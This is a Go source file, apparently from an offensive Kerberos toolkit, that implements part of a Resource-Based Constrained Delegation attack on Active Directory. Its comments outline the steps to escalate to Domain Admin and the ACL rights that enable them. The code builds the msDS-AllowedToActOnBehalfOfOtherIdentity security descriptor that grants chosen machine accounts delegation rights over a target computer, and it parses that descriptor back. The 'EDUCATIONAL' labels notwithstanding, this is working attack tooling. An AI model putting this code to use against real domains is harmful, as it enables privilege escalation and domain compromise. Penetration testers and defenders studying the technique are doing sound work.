package delegation

import (
	"encoding/binary"
	"fmt"

	"github.com/goobeus/goobeus/pkg/pac"
)

// EDUCATIONAL: RBCD (Resource-Based Constrained Delegation)
//
// RBCD flips the delegation model:
// - Classic: Service says "I can delegate to X, Y, Z"
// - RBCD: Target says "X, Y, Z can delegate to ME"
//
// The attack:
// 1. Find a computer where we can write msDS-AllowedToActOnBehalfOfOtherIdentity
// 2. Create a machine account (MAQ usually allows 10 per user)
// 3. Set the computer's RBCD attribute to include our machine account's SID
// 4. Use S4U2Self + S4U2Proxy from our machine to the target
// 5. Get access as any user (e.g., Domain Admin)!
//
// Common RBCD attack paths:
// - GenericWrite on computer object
// - WriteProperty on RBCD attribute
// - WriteDACL (can give ourselves GenericWrite)
// - Owner (can modify DACL)

// RBCDConfig represents RBCD configuration we want to set.
type RBCDConfig struct {
	// The SID(s) that should be allowed to delegate
	AllowedPrincipals []string // SID strings
}

// BuildRBCDSecurityDescriptor builds the security descriptor for RBCD.
//
// EDUCATIONAL: RBCD Security Descriptor
//
// msDS-AllowedToActOnBehalfOfOtherIdentity stores a security descriptor.
// The descriptor's DACL contains ACEs granting "Allowed to act on behalf of".
//
// Format: SECURITY_DESCRIPTOR with DACL containing ACCESS_ALLOWED_ACE for each SID
func BuildRBCDSecurityDescriptor(allowedSIDs []string) ([]byte, error) {
	if len(allowedSIDs) == 0 {
		return nil, fmt.Errorf("at least one SID is required")
	}

	// Parse SIDs
	var sids []*pac.SID
	for _, sidStr := range allowedSIDs {
		sid, err := pac.ParseSID(sidStr)
		if err != nil {
			return nil, fmt.Errorf("invalid SID %s: %w", sidStr, err)
		}
		sids = append(sids, sid)
	}

	// Build security descriptor
	sd := buildSecurityDescriptor(sids)
	return sd, nil
}

// buildSecurityDescriptor creates a self-relative security descriptor.
func buildSecurityDescriptor(sids []*pac.SID) []byte {
	// SECURITY_DESCRIPTOR header
	// Revision: 1
	// Sbz1: 0
	// Control: 0x8004 (SE_DACL_PRESENT | SE_SELF_RELATIVE)
	// OffsetOwner: 0 (no owner)
	// OffsetGroup: 0 (no group)
	// OffsetSacl: 0 (no SACL)
	// OffsetDacl: 20 (right after header)

	// Calculate sizes
	headerSize := 20
	aclHeaderSize := 8

	// ACE format: ACE header (4 bytes) + ACCESS_MASK (4 bytes) + SID
	var acesSize int
	for _, sid := range sids {
		aceSize := 4 + 4 + len(sid.Bytes())
		acesSize += aceSize
	}

	daclSize := aclHeaderSize + acesSize
	totalSize := headerSize + daclSize

	sd := make([]byte, totalSize)

	// SECURITY_DESCRIPTOR header
	sd[0] = 1                                                  // Revision
	sd[1] = 0                                                  // Sbz1
	binary.LittleEndian.PutUint16(sd[2:], 0x8004)              // Control: SE_DACL_PRESENT | SE_SELF_RELATIVE
	binary.LittleEndian.PutUint32(sd[4:], 0)                   // OffsetOwner
	binary.LittleEndian.PutUint32(sd[8:], 0)                   // OffsetGroup
	binary.LittleEndian.PutUint32(sd[12:], 0)                  // OffsetSacl
	binary.LittleEndian.PutUint32(sd[16:], uint32(headerSize)) // OffsetDacl

	// ACL header
	daclOffset := headerSize
	sd[daclOffset] = 2                                                  // AclRevision
	sd[daclOffset+1] = 0                                                // Sbz1
	binary.LittleEndian.PutUint16(sd[daclOffset+2:], uint16(daclSize))  // AclSize
	binary.LittleEndian.PutUint16(sd[daclOffset+4:], uint16(len(sids))) // AceCount
	binary.LittleEndian.PutUint16(sd[daclOffset+6:], 0)                 // Sbz2

	// ACEs
	aceOffset := daclOffset + aclHeaderSize
	for _, sid := range sids {
		sidBytes := sid.Bytes()
		aceSize := 4 + 4 + len(sidBytes)

		// ACE header
		sd[aceOffset] = 0                                                // AceType: ACCESS_ALLOWED_ACE_TYPE
		sd[aceOffset+1] = 0                                              // AceFlags
		binary.LittleEndian.PutUint16(sd[aceOffset+2:], uint16(aceSize)) // AceSize

		// ACCESS_MASK: Generic All (0x10000000)
		binary.LittleEndian.PutUint32(sd[aceOffset+4:], 0x10000000)

		// SID
		copy(sd[aceOffset+8:], sidBytes)

		aceOffset += aceSize
	}

	return sd
}

// ParseRBCDSecurityDescriptor parses the RBCD attribute to get allowed SIDs.
func ParseRBCDSecurityDescriptor(data []byte) ([]string, error) {
	if len(data) < 20 {
		return nil, fmt.Errorf("security descriptor too short")
	}

	// Check revision
	if data[0] != 1 {
		return nil, fmt.Errorf("unsupported SD revision: %d", data[0])
	}

	// Get DACL offset
	daclOffset := binary.LittleEndian.Uint32(data[16:])
	if daclOffset == 0 {
		return nil, nil // No DACL
	}
	if int(daclOffset)+8 > len(data) {
		return nil, fmt.Errorf("DACL offset out of bounds")
	}

	// Parse ACL header
	aceCount := binary.LittleEndian.Uint16(data[daclOffset+4:])

	// Parse ACEs
	var sids []string
	aceOffset := int(daclOffset) + 8

	for i := uint16(0); i < aceCount && aceOffset < len(data); i++ {
		if aceOffset+8 > len(data) {
			break
		}

		aceSize := binary.LittleEndian.Uint16(data[aceOffset+2:])
		if aceSize < 8 {
			break
		}

		// SID starts at offset 8 in the ACE
		if aceOffset+8+8 <= len(data) {
			sidData := data[aceOffset+8 : aceOffset+int(aceSize)]
			if len(sidData) >= 8 {
				sid := parseSIDFromBytes(sidData)
				if sid != "" {
					sids = append(sids, sid)
				}
			}
		}

		aceOffset += int(aceSize)
	}

	return sids, nil
}

// parseSIDFromBytes parses a SID from binary data.
func parseSIDFromBytes(data []byte) string {
	if len(data) < 8 {
		return ""
	}

	revision := data[0]
	numSubAuth := data[1]

	if len(data) < 8+int(numSubAuth)*4 {
		return ""
	}

	// Authority (big-endian)
	auth := uint64(0)
	for i := 0; i < 6; i++ {
		auth = (auth << 8) | uint64(data[2+i])
	}

	result := fmt.Sprintf("S-%d-%d", revision, auth)

	// Sub-authorities (little-endian)
	for i := 0; i < int(numSubAuth); i++ {
		sub := binary.LittleEndian.Uint32(data[8+i*4:])
		result += fmt.Sprintf("-%d", sub)
	}

	return result
}
